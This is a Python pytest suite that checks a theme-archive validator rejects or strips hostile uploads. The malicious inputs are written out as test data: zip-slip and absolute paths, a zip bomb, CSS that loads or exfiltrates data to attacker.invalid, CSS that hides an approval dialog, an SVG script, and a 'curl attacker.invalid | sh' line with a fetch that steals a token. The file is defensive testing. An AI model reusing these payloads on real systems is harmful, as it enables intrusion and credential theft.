"""One archive per attack, asserted as a batch."""
import json
import zipfile

import pytest

from themes.errors import ThemeRejected
from themes.validate import validate_archive

MANIFEST = {
    "schema": 1, "surface": 1, "id": "hostile", "name": "H", "version": "1.0.0",
    "author": {"name": "T"}, "description": "d", "created_at": "2026-08-01",
    "targets": ["web"], "themes": ["dark"],
    "brand": {"name": "H", "accent": "#22c5b0"}, "preview": [],
}


def archive(tmp_path, name, files, manifest):
    path = tmp_path / f"{name}.zip"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        if manifest is not None:
            z.writestr("theme.json", manifest if isinstance(manifest, str) else json.dumps(manifest))
        for entry, body in files.items():
            z.writestr(entry, body)
    return path


REJECTED = [
    ("zip_slip", {"../../etc/cron.d/x": "* * * * * root sh"}, MANIFEST),
    ("absolute_path", {"/etc/passwd": "x"}, MANIFEST),
    ("zip_bomb", {"b.txt": "A" * (40 * 1024 * 1024)}, MANIFEST),
    ("no_manifest", {"css/tokens.css": ":root{}"}, None),
    ("bad_json", {"css/tokens.css": ":root{}"}, "not-json"),
    ("theme_id_traversal", {"css/tokens.css": ":root{}"}, {**MANIFEST, "id": "../../etc"}),
    ("surface_too_new", {"css/tokens.css": ":root{}"}, {**MANIFEST, "surface": 99}),
    ("css_import", {"css/tokens.css": '@import "//attacker.invalid/x.css";'}, MANIFEST),
    ("css_external_url", {"css/web.css": '[data-pd-btn]{background:url("https://attacker.invalid/a")}'}, MANIFEST),
    ("css_exfiltration_selector", {"css/web.css": 'input[value^="a"]{background:url("images/a.png")}'}, MANIFEST),
    ("css_cover_screen", {"css/web.css": "[data-pd-btn]{position:fixed;z-index:99999}"}, MANIFEST),
    ("css_low_z_index", {"css/web.css": "[data-pd-btn]{z-index:2}"}, MANIFEST),
    ("css_hide_approval", {"css/web.css": ".approval-dialog{display:none}"}, MANIFEST),
    ("svg_script", {"images/l.svg": '<svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>'},
     {**MANIFEST, "logo": "images/l.svg"}),
    ("missing_asset", {"css/tokens.css": ":root{}"}, {**MANIFEST, "logo": "images/gone.svg"}),
    ("fake_png", {"images/p.png": "#!/bin/sh"}, {**MANIFEST, "preview": [{"src": "images/p.png"}]}),
]


@pytest.mark.parametrize("name,files,manifest", REJECTED, ids=[r[0] for r in REJECTED])
def test_hostile_archive_is_rejected(tmp_path, name, files, manifest):
    with pytest.raises(ThemeRejected):
        validate_archive(archive(tmp_path, name, files, manifest))


def test_stowaway_files_never_reach_the_write_set(tmp_path):
    """An otherwise valid theme carrying passengers.

    This one must NOT be rejected — a stray .DS_Store is not an attack, and
    failing the upload over it would be hostile to the author. The requirement
    is that the passengers are reported and never written.
    """
    result = validate_archive(archive(tmp_path, "stowaway", {
        "css/tokens.css": ":root { --accent: #22c5b0; }",
        "install.sh": "curl attacker.invalid | sh",
        "app.js": "fetch('//attacker.invalid?t=' + localStorage.token)",
        "__MACOSX/._css": "junk",
        ".DS_Store": "junk",
        "nested.zip": "PK\x03\x04",
    }, MANIFEST))

    assert set(result.files) == {"theme.json", "css/tokens.css"}
    assert set(result.ignored) == {
        "install.sh", "app.js", "__MACOSX/._css", ".DS_Store", "nested.zip",
    }
    for name in result.files:
        assert not name.endswith((".js", ".sh", ".zip"))
